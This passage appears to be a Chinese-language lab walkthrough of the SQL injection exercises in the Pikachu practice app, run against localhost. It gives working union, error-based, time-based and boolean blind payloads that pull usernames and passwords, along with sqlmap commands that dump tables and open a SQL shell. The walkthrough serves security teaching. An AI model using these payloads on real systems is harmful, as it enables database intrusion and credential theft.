<p>传入的id会直接拼接到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,email from member where id=$id</span><br></pre></td></tr></table></figure>

<p>于是就可以通过sql的语法执行我们想要的命令</p>
<p>当</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 or 1=1</span><br></pre></td></tr></table></figure>

<p>则sql代码就变为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select username,email from member where id=1 or 1=1</span><br></pre></td></tr></table></figure>

<p>此时where后面的逻辑会被判断为真，则会输出all</p>
<p>sql注入现在在真实环境中已经没有前几年那么流行，不过还是可能存在的严重漏洞</p>
<h1 id="数字型注入-POST"><a href="#数字型注入-POST" class="headerlink" title="数字型注入(POST)"></a>数字型注入(POST)</h1><p>提交后抓取数据包</p>
<p><img src="/images/image-20230109105642791.png" alt="image-20230109105642791"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and 1=1</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109111315150.png" alt="image-20230109111315150"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 and 1=2</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109111347975.png" alt="image-20230109111347975"></p>
<p>通过上述两个payload可以判断存在数字型的SQL注入</p>
<h3 id="猜字段数"><a href="#猜字段数" class="headerlink" title="猜字段数"></a>猜字段数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order by 2		# 正常</span><br><span class="line">id=1 order by 3		# 异常</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109111919855.png" alt="image-20230109111919855"></p>
<h5 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h5><p><img src="/images/image-20230109112009321.png" alt="image-20230109112009321"></p>
<p>order by后面的数字表示根据第几列进行排序</p>
<p><img src="/images/image-20230109112302345.png" alt="image-20230109112302345"></p>
<p>所以当order by指定的列不存在时，就会报错</p>
<p><img src="/images/image-20230109112352909.png" alt="image-20230109112352909"></p>
<h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><p>上述判断出存在两个字段，就可以构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0 union select 1,database()</span><br><span class="line"></span><br><span class="line">id=1 union select 1,database()</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109112828312.png" alt="image-20230109112828312"></p>
<p>返回的数据库名为pikachu</p>
<h5 id="union"><a href="#union" class="headerlink" title="union"></a>union</h5><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集</p>
<p>需要注意的是union后面输出的列数需要和order by得出的结果相同</p>
<p><img src="/images/image-20230109113000341.png" alt="image-20230109113000341"></p>
<p>否则会报错</p>
<p><img src="/images/image-20230109113022537.png" alt="image-20230109113022537"></p>
<p>很好理解，因为它要把两个表合并成一个表</p>
<p><img src="/images/image-20230109113152391.png" alt="image-20230109113152391"></p>
<h3 id="查询表名"><a href="#查询表名" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line">或直接代入数据库</span><br><span class="line">id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;pikachu&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109135947865.png" alt="image-20230109135947865"></p>
<p>pikachu数据库存在httpinfo,member,message,user,xssblind</p>
<h5 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h5><p>information_schema是MySQL系统自带的数据库</p>
<p><img src="/images/image-20230109134842484.png" alt="image-20230109134842484"></p>
<p>其中包括了几个重要的表(仅列几个这里用到的)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。</span><br><span class="line">TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。</span><br><span class="line">COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。</span><br></pre></td></tr></table></figure>

<p>即存放了数据库，表，列的相关信息</p>
<p>这里的information_schema.tables就包括了表的信息，table_schema列指向的就是其所属数据库</p>
<p>table_name就是表名</p>
<p><img src="/images/image-20230109135325713.png" alt="image-20230109135325713"></p>
<h5 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h5><p>可以理解为将字符串拼接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(&quot;a&quot;,1,&quot;b&quot;,table_name) from information_schema.tables;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109135737806.png" alt="image-20230109135737806"></p>
<p>当group_concat()中存在参数为字段名时，会将该列的所有字符串拼接输出</p>
<p>使用该函数主要是为了和union前的列数保持一致</p>
<h3 id="查询字段名"><a href="#查询字段名" class="headerlink" title="查询字段名"></a>查询字段名</h3><p>这里查询pikachu.user表的字段名，即表的列名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;</span><br></pre></td></tr></table></figure>

<p>字段信息在information_schema.columns表中</p>
<p><img src="/images/image-20230109140324209.png" alt="image-20230109140324209"></p>
<p>有id,username,password,level几个列</p>
<h3 id="读取字段的值"><a href="#读取字段的值" class="headerlink" title="读取字段的值"></a>读取字段的值</h3><p>users表下的username，password字段内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0 union select group_concat(username),group_concat(password) from pikachu.users</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109140614225.png" alt="image-20230109140614225"></p>
<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>由于是post请求，需要先保存数据包</p>
<p><img src="/images/image-20230109141141373.png" alt="image-20230109141141373"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch</span><br></pre></td></tr></table></figure>

<p>使用-r参数指定post文件</p>
<p>-p参数指定注入点</p>
<p>–batch后续需要选择Y&#x2F;N时程序默认选择</p>
<p><img src="/images/image-20230109141451060.png" alt="image-20230109141451060"></p>
<p>当出现这样表示存在sql注入</p>
<h5 id="输出数据库相关信息"><a href="#输出数据库相关信息" class="headerlink" title="输出数据库相关信息"></a>输出数据库相关信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch --schema</span><br></pre></td></tr></table></figure>

<p>–schema参数输出数据库相关信息</p>
<p><img src="/images/image-20230109141715448.png" alt="image-20230109141715448"></p>
<h5 id="输出pikachu的表"><a href="#输出pikachu的表" class="headerlink" title="输出pikachu的表"></a>输出pikachu的表</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch -D pikachu --tables</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109141832527.png" alt="image-20230109141832527"></p>
<h5 id="输出pikachu-users的字段名"><a href="#输出pikachu-users的字段名" class="headerlink" title="输出pikachu.users的字段名"></a>输出pikachu.users的字段名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch -D pikachu -T users --columns</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109141926918.png" alt="image-20230109141926918"></p>
<h5 id="输出pikachu-users-users的字段值"><a href="#输出pikachu-users-users的字段值" class="headerlink" title="输出pikachu.users.users的字段值"></a>输出pikachu.users.users的字段值</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch -D pikachu -T users --dump</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109142034486.png" alt="image-20230109142034486"></p>
<h5 id="进入sql-shell"><a href="#进入sql-shell" class="headerlink" title="进入sql shell"></a>进入sql shell</h5><p>提供数据库的交互命令行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p id --batch --sql-shell</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109142253366.png" alt="image-20230109142253366"></p>
<h5 id="或"><a href="#或" class="headerlink" title="或"></a>或</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_id.php --data=&quot;id=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch -p id</span><br></pre></td></tr></table></figure>

<h1 id="字符型注入-GET"><a href="#字符型注入-GET" class="headerlink" title="字符型注入(GET)"></a>字符型注入(GET)</h1><p>输入一个分号</p>
<p><img src="/images/image-20230109142507119.png" alt="image-20230109142507119"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109142618699.png" alt="image-20230109142618699"></p>
<p>可以判断出该注入是字符型注入</p>
<h3 id="查字段数"><a href="#查字段数" class="headerlink" title="查字段数"></a>查字段数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27; order by 2%23</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109143133507.png" alt="image-20230109143133507"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27; order by 3%23</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109143215156.png" alt="image-20230109143215156"></p>
<p>%23是#的url编码，表示注释符</p>
<p>字段数为2</p>
<h3 id="查询数据库名-1"><a href="#查询数据库名-1" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27; union select 1,database()%23</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109143432513.png" alt="image-20230109143432513"></p>
<h3 id="查询表名-1"><a href="#查询表名-1" class="headerlink" title="查询表名"></a>查询表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109143512248.png" alt="image-20230109143512248"></p>
<h3 id="查询字段名-1"><a href="#查询字段名-1" class="headerlink" title="查询字段名"></a>查询字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109143547949.png" alt="image-20230109143547949"></p>
<h3 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=vince&#x27; union select group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109143631888.png" alt="image-20230109143631888"></p>
<h3 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch -p name</span><br></pre></td></tr></table></figure>

<p>由于是get请求提交参数</p>
<p>-u指定url即可</p>
<p>其余利用在数字型注入(POST)中有详细描述</p>
<p><img src="/images/image-20230109143915692.png" alt="image-20230109143915692"></p>
<h1 id="XX型注入"><a href="#XX型注入" class="headerlink" title="XX型注入"></a>XX型注入</h1><p>根据提示，和闭合有关</p>
<p><img src="/images/image-20230109150223050.png" alt="image-20230109150223050"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27;)#</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109150610816.png" alt="image-20230109150610816"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kobe&#x27;#</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109150722802.png" alt="image-20230109150722802"></p>
<p>可以判断源码大致为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select xxx from xxx where username=&#x27;(name)&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猜字段数</span><br><span class="line">?name=a&#x27;) order by 2%23</span><br><span class="line"></span><br><span class="line">查询数据库名</span><br><span class="line">?name=1&#x27;) union select 1,database()%23</span><br><span class="line"></span><br><span class="line">查询表名</span><br><span class="line">?name=1&#x27;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">?name=1&#x27;) union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">?name=1&#x27;) union select group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_x.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --batch -p name</span><br></pre></td></tr></table></figure>

<h1 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h1><p>输入”v”就会显示所有用户名中含有”v”的用户信息</p>
<p><img src="/images/image-20230109144137831.png" alt="image-20230109144137831"></p>
<p>这里肯定使用了sql语句的模糊查询</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select xx,xx,xx from xx where xxx like &#x27;%输入的值%&#x27;;</span><br></pre></td></tr></table></figure>

<p>LIKE 关键字支持百分号”%”(匹配任意长度字符)和下划线”_”(匹配单个字符)通配符</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_name like &quot;%TA%&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109144913575.png" alt="image-20230109144913575"></p>
<p>可以判断下服务端的通配符这些是怎么写的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=v%&#x27;%23</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109145416985.png" alt="image-20230109145416985"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=v&#x27;%23</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109145442722.png" alt="image-20230109145442722"></p>
<p>可以大致判断出源码可能为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select xxxx from xx where xxx like &#x27;%输入的值%&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猜字段数</span><br><span class="line">?name=a%&#x27; order by 3%23</span><br><span class="line">这里的a需要使用有输出的字母，使用1，2等这种没有输出</span><br><span class="line"></span><br><span class="line">查询数据库名(为了方便观察，把查询的字符改成其他)</span><br><span class="line">?name=1%&#x27; union select 1,2,database()%23</span><br><span class="line"></span><br><span class="line">查询表名</span><br><span class="line">?name=1%&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">?name=1%&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">?name=1%&#x27; union select 1,group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap-3"><a href="#sqlmap-3" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_search.php?name=1&amp;submit=%E6%90%9C%E7%B4%A2&quot; --batch -p name</span><br></pre></td></tr></table></figure>

<p>详细可参考数字型注入(POST)</p>
<p><img src="/images/image-20230109150021856.png" alt="image-20230109150021856"></p>
<h1 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h1><p>根据提示</p>
<p>用户名密码为admin&#x2F;123456</p>
<p><img src="/images/image-20230109230812814.png" alt="image-20230109230812814"></p>
<p>可以知道，服务器收集了请求头的user-agent和http accept请求头</p>
<p>抓取该界面的数据包</p>
<p><img src="/images/image-20230109231026283.png" alt="image-20230109231026283"></p>
<p>更改user-agent为test</p>
<p><img src="/images/image-20230109231106364.png" alt="image-20230109231106364"></p>
<p>将user-agent改为分号，报错，存在sql注入</p>
<p><img src="/images/image-20230109231226177.png" alt="image-20230109231226177"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: admin&#x27;,&#x27;&#x27;)#</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109233012407.png" alt="image-20230109233012407"></p>
<p>该错误的意思是传入表的字段数和values值的个数不一样</p>
<p>通过这个其实能判断出其应该为insert注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert 表名(字段1,字段2,字段3，字段4) values(数据1,数据2,数据3,数据4);</span><br></pre></td></tr></table></figure>

<p>除了user-agent和accept请求头的值，该表还存储了其他的值，所以报错</p>
<h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><p>使用报错注入</p>
<h5 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select database()),&#x27;~&#x27;),1) or &#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109233600397.png" alt="image-20230109233600397"></p>
<p>其细节在insert注入中有详细说明</p>
<h5 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: x&#x27; or updatexml(1,concat(&#x27;.&#x27;,(select username from users limit 0,1),&#x27;.&#x27;),1) or &#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109233713229.png" alt="image-20230109233713229"></p>
<h2 id="sqlmap-4"><a href="#sqlmap-4" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>将请求包保存为文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -p User-Agent --batch</span><br></pre></td></tr></table></figure>

<h1 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h1><p>当输入任何数据后返回的信息都是同样的时候，可以尝试时间盲注，通过网页加载的时间判断是否存在注入</p>
<p><img src="/images/image-20230110084215643.png" alt="image-20230110084215643"></p>
<p>该页面无论输入什么输出的内容都是”i don’t care who you are!”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&quot; and sleep(2)%23 //正常加载</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and sleep(2)%23 //延迟2秒加载</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110085004995.png" alt="image-20230110085004995"></p>
<p>判断该注入为字符型注入，并且闭合是分号</p>
<h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h2><p>时间盲注猜解数据库信息和布尔盲注类似，不同的是多利用到if语句和sleep函数</p>
<h4 id="mysql-if"><a href="#mysql-if" class="headerlink" title="mysql if"></a>mysql if</h4><p>sleep(n)就是停止n秒，这里就不再提了</p>
<p><img src="/images/image-20230110085453488.png" alt="image-20230110085453488"></p>
<h4 id="猜数据库名长度"><a href="#猜数据库名长度" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(length(database())&gt;=8,sleep(2),1)%23	# 返回时间4毫秒</span><br><span class="line">?name=lili&#x27; and if(length(database())&gt;=7,sleep(2),1)%23	# 返回时间2秒</span><br></pre></td></tr></table></figure>

<h4 id="猜数据库名"><a href="#猜数据库名" class="headerlink" title="猜数据库名"></a>猜数据库名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(ascii(substr(database(),1,1))&gt;=112,sleep(2),1)%23	# 第一位112</span><br><span class="line">?name=lili&#x27; and if(ascii(substr(database(),2,1))&gt;=105,sleep(2),1)%23	# 第二位105</span><br></pre></td></tr></table></figure>

<h4 id="猜表信息"><a href="#猜表信息" class="headerlink" title="猜表信息"></a>猜表信息</h4><p>猜数据表个数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())&gt;=5,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜表名长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=8,sleep(2),1)%23		# 第一张表表名长度为8</span><br><span class="line">?name=lili&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=6,sleep(2),1)%23		# 第二张表表名长度为6</span><br></pre></td></tr></table></figure>

<p>猜表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;=104,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>通过修改limit、substr值来限制查询位置与个数</p>
<h4 id="猜字段信息"><a href="#猜字段信息" class="headerlink" title="猜字段信息"></a>猜字段信息</h4><p>猜字段个数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1)&gt;=4,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜字段名长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(length((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;  limit 0,1))&gt;=2,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),1,1))&gt;104,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<h4 id="猜字段值"><a href="#猜字段值" class="headerlink" title="猜字段值"></a>猜字段值</h4><p>猜字段值个数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if((select count(id) from users)&gt;=3,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜字段值长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(length((select username from users limit 0,1))&gt;=5,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>猜字段内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;=97,sleep(2),1)%23</span><br></pre></td></tr></table></figure>

<p>不同的字段通过limit控制</p>
<p>字段中不同的字符通过substr控制</p>
<p>判断个数用lenth控制</p>
<h2 id="sqlmap-5"><a href="#sqlmap-5" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1:88/DX/pikachu/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -p name --batch</span><br></pre></td></tr></table></figure>

<h1 id="基于boolian的盲注"><a href="#基于boolian的盲注" class="headerlink" title="基于boolian的盲注"></a>基于boolian的盲注</h1><p>当没有任何输出的时候，就需要使用到盲注</p>
<p>布尔盲注的场景条件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.没有任何报错输出</span><br><span class="line"></span><br><span class="line">2.能够判断出ture还是false(比如条件正确有结果错误没有结果)</span><br></pre></td></tr></table></figure>

<p>本题输入正确的用户名lili</p>
<p><img src="/images/image-20230109234433676.png" alt="image-20230109234433676"></p>
<p>输入错误的用户名</p>
<p><img src="/images/image-20230109234546270.png" alt="image-20230109234546270"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lili&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109234741138.png" alt="image-20230109234741138"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lili&#x27;#</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109234818055.png" alt="image-20230109234818055"></p>
<p>所以可以判断出为字符型注入，且闭合为’</p>
<h2 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h2><p>盲注最麻烦的就是，正确会显示一个结果，错误又显示另一个结果，没有其余的显示</p>
<p>所以所有的数据库名，字段值等，只能靠猜</p>
<h3 id="猜数据库名长度-1"><a href="#猜数据库名长度-1" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and length(database())&gt;=7%23	# 回显正常</span><br><span class="line">?name=lili&#x27; and length(database())&gt;=8%23	# 回显异常</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230109235411194.png" alt="image-20230109235411194"></p>
<p>数据库长度为7</p>
<h3 id="猜数据库值"><a href="#猜数据库值" class="headerlink" title="猜数据库值"></a>猜数据库值</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lili&#x27; and ascii(substr(database(),1,1))&gt;113#</span><br><span class="line"></span><br><span class="line">lili&#x27; and ascii(substr(database(),1,1))&gt;=112#</span><br></pre></td></tr></table></figure>

<p>p的ascii码为112</p>
<p><img src="/images/image-20230110000502120.png" alt="image-20230110000502120"></p>
<p>于是对每个字符都这么测</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lili&#x27; and ascii(substr(database(),2,1))&lt;112#</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110000702020.png" alt="image-20230110000702020"></p>
<p>所以第二个字符在a-p之间</p>
<h5 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII()"></a>ASCII()</h5><p>输出指定字符的ascii码值</p>
<h5 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h5><p><img src="/images/image-20230110000156970.png" alt="image-20230110000156970"></p>
<h3 id="猜数据表个数"><a href="#猜数据表个数" class="headerlink" title="猜数据表个数"></a>猜数据表个数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lili&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;=6#</span><br></pre></td></tr></table></figure>

<p>原理如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select (select 1) &lt;= 1;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20230110001003872.png" alt="image-20230110001003872"></p>
<h3 id="猜数据表名长度"><a href="#猜数据表名长度" class="headerlink" title="猜数据表名长度"></a>猜数据表名长度</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=lili&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=9%23</span><br><span class="line">?name=lili&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;=8%23</span><br></pre></td></tr></table></figure>

<h3 id="猜数据表名"><a href="#猜数据表名" class="headerlink" title="猜数据表名"></a>猜数据表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猜第一张表表名的第一个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;=105%23</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;=104%23</span><br><span class="line"></span><br><span class="line">猜第一张表表名的第二个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;=116%23</span><br><span class="line"></span><br><span class="line">猜第二张表表名的第一个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))&gt;=109%23</span><br><span class="line"></span><br><span class="line">猜第二张表表名的第二个字符串</span><br><span class="line">?name=lili&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))&gt;=101%23</span><br></pre></td></tr></table></figure>

